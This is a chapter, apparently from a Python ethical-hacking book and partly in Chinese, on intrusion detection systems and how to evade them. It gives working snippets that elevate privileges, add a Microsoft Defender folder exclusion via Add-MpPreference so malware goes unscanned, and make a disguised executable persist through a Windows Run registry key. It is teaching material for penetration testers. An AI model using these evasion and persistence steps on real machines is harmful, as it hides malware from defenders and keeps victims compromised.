- "# 9 System Protection and Perseverance\n\nIn this chapter, we are going to focus\
  \ our attention on how defense mechanisms work and by understanding how they work,\
  \ you can learn what techniques you can use to bypass them. We will start by learning\
  \ about intrusion detection systems and their different types. After that, we will\
  \ learn about detection mechanisms. Once we understand these mechanisms, we will\
  \ try to bypass them using our tools. In summary, this chapter will focus on the\
  \ following topics:\n\n- System protection\n- Intrusion detection methods\n- Detection\
  \ mechanisms\n- Bypassing IDSes\n\n## Persistence system protection\n\nOur previous\
  \ chapters focused on creating malware and carrying out different attacks. This\
  \ is the offensive side of attacks. However, in real-life hacking, you need to know\
  \ how to protect yourself against external attacks. A better understanding of protection\
  \ mechanisms would help you to not only protect yourself, but this knowledge would\
  \ also help you to carry out successful attacks. The first line of defense against\
  \ external network attacks, or system attacks in general, is the **Intrusion Detection\
  \ System (IDS)**. IDS is an umbrella term for a lot of tools used for system security\
  \ and protection, so we must learn about them in detail.\n\n## Intrusion detection\
  \ systems\n\nIDSes are a system that monitor and detect the components of your network\
  \ or system on a continuous basis to detect any undesirable or suspicious behavior.\
  \ The goal of an IDS is to prevent any undesirable scenario in a system. Fundamentally,\
  \ there are three types of IDS:\n\n- Host-based IDSes\n- Network-based IDSes\n-\
  \ Hybrid IDSes\n\nLet's discuss these in detail in the following sections.\n\n##\
  \ Host-based IDSes\n\nHost-based IDSes run on the system they are monitoring. Along\
  \ with other software, host-based IDSes monitor the filesystem to scan for any potentially\
  \ harmful files. They also monitor and analyze network traffic to see whether any\
  \ malicious traffic is occurring over the network.\n\nHost-based IDSes are an important\
  \ part of a system's security apparatus; however, they often do not give complete\
  \ details regarding the security state of the system. They can be modified and even\
  \ bypassed by different attacks. An important aspect of a host-based IDS is how\
  \ up to date it is in terms of modern threat detection. It should constantly keep\
  \ up with the modern threats and block them immediately if it detects them. An important\
  \ feature of a host-based IDS is to keep a log of all critical activities occurring\
  \ on a system. This can help a lot in threat detection and incidence response.\n\
  \nOn most common OSes, you have some sort of host-based IDS already built in. In\
  \ a Windows OS, Windows built-in antivirus is part of the host IDS. It monitors\
  \ and detects any suspicious activity on the system and blocks potential threats\
  \ from acting on a system. Along with virus detection, it also works to detect any\
  \ tampering of critical Windows infrastructure.\n\n## Network-based IDSes\n\nAnother\
  \ important aspect of system security is network-based protection. Network-based\
  \ IDSes play a key role in limiting external network attacks from taking place.\
  \ They play a role in protecting all devices present in a network. It observes network\
  \ traffic over the whole subnet to monitor suspicious activity. It can be combined\
  \ with firewalls to provide additional security. Sometimes, network-wide firewalls\
  \ are part of an IDS.\n\n## Hybrid IDSes\n\nAs the name suggests, these detection\
  \ systems provide much more security for the system as compared with individual\
  \ systems. They combined both system-based and network-based approaches to catch\
  \ malicious behavior and have a much higher rate of detection. Modern hybrid IDSes\
  \ use both conventional and artificial intelligence (AI)-based techniques to prevent\
  \ network attacks.\n\nNow that we have learned about different types of IDS, let’s\
  \ see how these IDSes work.\n\n## IDS detection mechanisms\n\nMost common IDSes\
  \ work by using the following two fundamental techniques, although modern IDSes\
  \ use much more sophisticated approaches. Let’s take a look at different detection\
  \ mechanisms and how they are used in real systems.\n\n\n\n\n\n## 基于签名的检测\n\n这是一种经典的知识型方法，自计算机安全早期以来就一直在使用。在这种方法中，防护软件可以访问一个庞大的已知恶意软件数据库。利用该数据库，它可以看到恶意软件中存在哪些字节，然后只需将系统引入的任何新文件与该字节序列进行比较。如果未知文件的字节序列与数据库中存在的字节序列匹配，这意味着该未知文件很可能具有恶意性，并且它会立即阻止该文件。否则，它将继续正常操作。该算法在其最简单的形式下如下所示：\n\
  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_194_0.png)\n\n图 9.1 – 基于签名的检测机制\n\n基于签名的检测对于已知恶意软件效果很好，因此一个好的\
  \ IDS 必须拥有更大的恶意软件数据库。这种方法的好坏完全取决于其用于测试的数据库。尚未被检测到的新编写的恶意软件将对该测试产生假阴性。\n\n## 基于异常的检测\n\
  \n这些检测系统的工作方式与基于签名的方法不同。它们监控程序所进行的活动。它定义了某些被视为 *正常行为* 的场景，然后寻找这些行为中的任何异常。例如，游戏软件不应尝试禁用防病毒系统。一旦恶意程序试图做一些它不应该做的事情，这些系统就会将这些程序标记为可疑，并在它们检测到程序试图执行绝对不应该执行的操作之前持续监控它们。一旦检测到可疑行为，它要么完全阻止该程序，要么为管理员生成\
  \ *红色警报*。\n\n请注意，IDSes 和 **入侵防御系统 (IPSes)** 之间存在细微差别。出于实际目的，大多数情况下，这些任务由同一软件执行，我们在实践中不会对它们进行区分。然而，有时你会看到\
  \ IDS 和 IPS 被分别提及，因此你应该知道它们之间的区别。\n\n现在我们已经了解了 IDS 是什么以及它是如何工作的，我们可以开始构建一个程序来学习如何绕过这些系统。\n\
  \n## 绕过 IDS\n\n在 *第 6 章，恶意软件开发* 和 *第 7 章，高级恶意软件* 中，我们开发了我们的恶意软件程序，而在 *第 8 章，后渗透*\
  \ 中，我们学习了如何将我们的恶意软件打包成特洛伊木马。我们的恶意软件运行良好，如果 IDS 使用基于签名的方法，它很可能不会被检测到，因为恶意软件是由你编写的，而你的程序在任何地方都没有签名。然而，现代\
  \ IDS 非常聪明，经过几次运行后，它们会开始注意到可疑行为，并为此使用非常详尽的方法。在本节中，我们将尝试了解如何运行我们的 Python 可执行文件并获得管理员权限。这将有助于在受害者机器上完成某些任务，而\
  \ *普通* 可执行文件无法完成。例如，在 Windows 上禁用防病毒程序，或为某个文件夹创建例外以使病毒扫描程序不扫描它，都需要在 Windows 上具有管理员权限。你无法使用普通可执行文件执行此类活动。\n\
  \n让我们先看看如何以 *管理员权限* 运行可执行文件。你可以将此方法与你的恶意软件程序结合使用。然而，为了简单起见，我将使用一个简单的 Python 脚本来演示此过程。\n\
  \n让我们创建一个新的 Python 脚本。同样创建一个新的虚拟环境。提升 Python 程序权限的方法有很多，你会在网上找到多个解决方案。然而，我发现的最简单的解决方案是使用一个名为\
  \ elevate 的库。由于我们将为演示目的创建可执行文件，让我们也安装 pyinstaller。\n\n一旦你在虚拟环境中创建了新项目并安装了 pyinstaller，让我们运行以下行来下载\
  \ elevate Python 模块：\n\n```\npip install elevate\n```\n\n一旦安装了此包，你就可以在代码中使用它来提高可执行文件的权限。根据我的经验，我发现将此功能放在脚本开头是个好主意，以获得最佳效果。要提升脚本的权限，你只需调用此模块中的\
  \ elevate 函数即可。\n\n让我们先看看在我们使用此模块之前用户权限级别是什么。只需编写以下代码进行测试。我们可以使用 os 模块来检查 root 权限：\n\
  \n```\nimport ctypes\nimport platform\ndef is_root():\n    if platform.system()\
  \ == \"Windows\":\n        return ctypes.windll.shell32.IsUserAnAdmin()\n    else:\n\
  \        return 1\n\nprint(is_root())\n```\n\n你可以使用上述代码来查看程序是否以提升模式运行。如果前一段代码返回的值为\
  \ 1，这意味着它以管理员身份运行，否则它以非管理员模式运行。让我们运行之前的程序来查看执行模式：\n\n```\n(venv) C:\\Users\\fahad-sarwar\\\
  Desktop\\example13-privilege-escalation>python priv.py\n0\n```\n\n图 9.2 – 无管理员权限\n\
  \n按下 **Yes** 后，你将看到以下屏幕，表明已创建一个新进程并以更高的权限运行，用 1 表示：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_198_0.png)\n\
  \n图 9.4 – 管理员权限\n\n现在我们已经学会如何以管理员身份运行脚本，让我们看看如何修改 Windows 设置以将例外添加到 IDS 扫描中。我们将向\
  \ Windows 例外规则添加一个目录。这将允许我们跳过对某个目录的病毒扫描，并帮助我们在该目录中植入恶意软件。\n\n提升权限的完整代码位于以下链接：https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example14-priv-escalation/escalation.py。\n\
  \n在之前的程序中，我们首先提升权限，然后在 Windows Defender 设置中为我们恶意软件所在的文件夹添加一个例外。这将跳过对当前文件夹的扫描。以下代码实现了此目的：objective.d:\n\
  \n```\ncommand = \"Add-MpPreference -ExclusionPath \" + dir_to_add\nall_commands.append(command)\n\
  ```\n\n上一行将例外添加到 Microsoft Defender 扫描存储库中，如以下屏幕截图所示：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_198_1.png)\n\
  \n图 9.5 – 为病毒扫描添加了排除项\n\n现在我们知道如何让我们的程序以隐身模式运行并避免被 IDS 检测到。接下来，我们将为我们的程序添加持久性。这将允许我们的程序在\
  \ Windows 启动时运行，这样用户就不必每次都点击恶意软件程序以便我们建立反向连接。受害者只需点击一次恶意软件，我们就会为启动程序添加一个 Windows\
  \ 注册表项，这样每次计算机启动时，我们的恶意软件程序都会运行。你可以将此方法用于我们在第 6 章《恶意软件开发》和第 7 章《高级恶意软件》中开发的受害者程序。这里，为了简单起见，我将只使用一个演示脚本。\n\
  \n## 持久性\n\n在本节中，我们将学习如何在 Windows 启动时运行我们的 Python 脚本。让我们创建一个新项目。你也可以修改我们在第 6 章《恶意软件开发》和第\
  \ 7 章《高级恶意软件》中开发的受害者程序。为了为我们的程序添加持久性，我们需要确切知道我们正在运行的可执行文件的名称。一旦我们知道可执行文件，我们就可以在其他地方复制此可执行文件，并在系统每次启动时从那里运行它。这听起来很复杂，所以让我们一步一步来看。首先，我们需要知道可执行文件的名称。为了找出这一点，让我们编写以下代码：\n\
  \n```\nimport sys\ncurr_executable = sys.executable\nprint(\"Current executable\
  \ : \", curr_executable)\n```\n\n如果将上述程序作为 Python 脚本运行，其输出如下：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_199_0.png)\n\
  \n图 9.6 – 当前解释器名称\n\n这只告诉我们 Python 解释器的名称，而不是我们需要的可执行文件的名称。为什么会这样？因为我们目前只是在运行一个脚本。获取实际可执行文件名称的唯一方法是在我们将文件作为二进制可执行文件运行时使用\
  \ pyinstaller。创建一个二进制可执行文件并通过双击运行它。看一下以下屏幕截图：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_199_1.png)\n\
  \n图 9.7 – 实际可执行文件名称\n\n\n\n\n\n你可以看到现在我们已经获取到了所需的实际可执行文件名。下一步是复制这个可执行文件并将其存储在其他位置，使其对受害者隐藏，最后将其添加到启动应用程序的注册表中。\n\
  \n我们将把这个可执行文件复制到 Windows 上的 AppData 文件夹中，这是一个包含应用程序数据的特殊文件夹。要获取 AppData 文件夹的路径，可以编写以下代码：\n\
  \n```\napp_data = os.getenv(\"APPDATA\")\n```\n\n让我们重命名可执行文件，使其看起来不那么可疑。我们将把这个可执行文件命名为\
  \ system32_data.exe。这是一个虚构的名称，你可以使用任何你想要的名称：\n\n```\nto_save_file = app_data + \"\
  \\\\\" + \"system32_data.exe\"\n```\n\n接下来，将当前可执行文件复制到 AppData 并重命名。我们需要从 Python\
  \ 标准库中导入 shutil 模块：\n\n```\nshutil.copyfile(curr_executable, to_save_file)\n```\n\
  \n要在启动时将其添加到 Windows 注册表中，你需要运行以下代码：\n\n```\nkey = winreg.HKEY_CURRENT_USER\n##\
  \ \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\nkey_value = \"Software\\\
  \\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\"\nkey_obj = winreg.OpenKey(key,\
  \ key_value, 0, winreg.KEY_ALL_ACCESS)\nwinreg.SetValueEx(key_obj, \"systemfilex64\"\
  , 0, winreg.REG_SZ, to_save_file)\nwinreg.CloseKey(key_obj)\n```\n\n这段代码只是将包含可执行文件名的\
  \ to_save_file 字符串添加到启动注册表中。\n\n要对程序进行更改，你需要以管理员模式运行此可执行文件，因此你可以复制上一节中的代码并将其添加到此脚本的开头。完整代码如下：\n\
  \n```\nif not os.path.exists(to_save_file):\n    print(\"Becoming Persistent\")\n\
  \    shutil.copyfile(curr_executable, to_save_file)\n    key = winreg.HKEY_CURRENT_USER\n\
  \    # \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\n    key_value = \"\
  Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\"\n    key_obj = winreg.OpenKey(key,\
  \ key_value, 0, winreg.KEY_ALL_ACCESS)\n    winreg.SetValueEx(key_obj, \"systemfilex64\"\
  , 0, winreg.REG_SZ, to_save_file)\n    winreg.CloseKey(key_obj)\nelse:\n    print(\"\
  path doesn't exist\")\n```\n\n运行代码后，如果你进入 AppData 文件夹，你将看到以下可执行文件：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_201_0.png)\n\
  \n图 9.8 – 当前可执行文件已复制到 AppData 文件夹\n\n此外，要验证 Windows 注册表是否已被修改，通过在 Windows 搜索中搜索\
  \ regedit 打开注册表编辑器。打开它并转到以下路径：\n\n```\nHKEY_CURRENT_USER\\Software\\Microsoft\\\
  Windows\\CurrentVersion\\Run\n```\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_201_1.png)\n\
  \n图 9.9 – 已编辑的注册表\n\n最后一行是我们刚刚添加的条目。你可以看到前一张截图中 **Data** 字段链接到我们刚刚复制的可执行文件。现在，如果你重启电脑，你会看到系统启动后，上述可执行文件将自动启动。作为练习，尝试使用受害者恶意程序复制相同的操作。当受害者启动其计算机时，你应该能够从受害者机器上获得返回连接。\n\
  \n## Summary\n\n在本章中，我们学习了不同的系统保护技术。我们首先了解了系统保护以及不同 IDS/IPS 的工作原理。我们学习了不同类型的检测机制。我们还学习了使用具有提升权限的可执行文件。最后，我们学习了如何使我们的可执行文件保持持久性。结合你在前几章中学到的知识，这将使你能够在不被轻易检测到的情况下开发你的恶意工具。只要你保持恶意软件对系统的影响较低，IDS\
  \ 就很难检测到你的恶意软件。我希望你学到了很多并喜欢这本书！请记住网络安全是一个不断变化的领域，你需要不断跟上现代工具，才能成为一名成功的渗透测试员。\n\n\
